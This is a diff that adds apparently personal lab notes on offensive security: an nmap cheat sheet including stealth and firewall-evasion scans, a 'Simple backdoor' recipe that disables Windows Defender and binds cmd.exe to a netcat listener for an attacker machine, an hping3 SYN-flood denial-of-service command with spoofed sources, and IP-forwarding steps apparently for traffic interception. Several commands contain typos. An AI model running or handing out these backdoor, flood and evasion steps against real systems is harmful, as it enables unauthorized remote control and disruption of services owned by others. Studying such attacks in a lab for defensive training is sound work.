@@ -1,0 +1,120 @@
+-c 1nmap
+{
+	sudo apt-get install nmap
+	1. Scan a System with Hostname 
+		-nmap www.msrit.edu
+	2. Scan a System with IP Address
+		-nmap 172.217.27.174
+	3. Scan using “-v” option(It is used to get more detailed information about the remote machines)
+		-nmap -v www.geeksforgeeks.org
+	4. Scan Multiple Hosts
+		-nmap 103.76.228.244 157.240.198.35 172.217.27.174
+	5. Scan a whole Subnet
+		-nmap 103.76.228.*
+	6. Scan Multiple Servers using last octet of IP address(octet=last 3 numbers of an IP address)
+		-nmap 172.217.27.174,175,176
+	7. Scan list of Hosts from a File
+			(cat > input.txt,locolhost,server2.tecmint.com,192.168.0.101)
+		-nmap -iL input.txt
+	8. Scan an IP Address Range
+		-nmap 172.217.27.174-178
+	9. Scan OS information and Traceroute
+		-nmap -A 192.168.0.12
+	10. Enable OS Detection with Nmap
+		-sudo nmap -O 192.168.0.12 / -osscan-guess
+	11. Scan a Host to Detect Firewall
+		-sudo nmap -sA 192.168.0.12
+	12. Scan a Host to check its protected by Firewall
+		-sudo -PN 192.168.0.12
+	13. Find out Live hosts in a Network
+		-nmap -sP 192.168.0.12
+	14. Perform a Fast Scan
+		-nmap -F 192.168.0.12
+	15. Scan for specific Port
+		-nmap -p 135 192.168.0.12
+	16. Scan Multiple Ports
+		-nmap -p 80,443 192.168.0.12
+	17. Find Host Services version Numbers
+		-nmap -sV 192.168.0.12
+	18. Scan a TCP Port
+		-nmap -p T:3000,135 192.168.0.12
+	19. Scan a UDP Port
+		-sudo nmap -sU 192.168.0.12
+	20. Popular Ports Scanning
+		-sudo nmap -sT 192.168.0.12
+_________________________________________________________________________________________
+Perform a tcp null scan to fool a firewall
+	-nmap -sN 192.168.0.12
+Perform a stealthy Scan
+	-nmap -sS 192.168.0.12
+Scan Remote host for specific ports with TCP Syn
+	-nmap -PS -p 22,80 192.168.0.101
+Scan Remote host for specific ports with TCP ACK
+	-nmap -PA -p 22,80 192.168.0.101
+Scan remote hosts using TCP ACK (PA) and TCP Syn (PS)
+	-nmap -PS 192.168.0.12
+Scan Ports by Network Range
+	-nmap -p 80-160 192.168.0.12
+Print Host interfaces and Routes
+	-nmap --iflist
+Scan Ports Consecutively
+	-nmap -r 192.168.0.12
+Find Nmap version
+	-nmap -V
+Scan Network Excluding Remote Hosts
+	-nmap 192.168.0.12.* --exclude 192.168.0.100
+}
+_______________________________________________________________________________________
+_______________________________________________________________________________________
+Simple backdoor
+{
+windows(TARGET)
+1.On windows disable defender firewall,virus threat protection>real time threat protection
+2.Download netcat for windows 10 > first website > netcat 1.11
+3.extract the downloaded file to c/windows/system32
+4.Run cmd as admin > cd netcat-1.11
+						dir
+nc64.exe
+(This enters to the netcat command line)
+nc -l -p 53 -e cmd.exen
+
+ON KALI(ATTACKER)
+nc
+nc 192.168.0.12 53
+
+chatting
+{
+	first windows:nc64.exe -nvlp/nlvp 4444
+	second Kali :nc -nv 192.168.0.12 4444
+}
+
+
+
+}
+
+____________________________________________________________________________________
+____________________________________________________________________________________
+DOS attack/syn flood attack
+
+in kali
+ hping3
+
+ hping3 -c 10000000 -d 100000 -S -w 64 -p 80 --flood --rand-source 192.168.29.130
+
+after executing go to target system(windows) taskmanager/performance network usage graph will be 80-90% from 0
+
+
+
+
+
+___________________________________________________________________
+
+cat /proc/sys/net/ipv4/ip_forword
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+wireshark
+
+testphp.vulneb
+
+arp -a to check mac
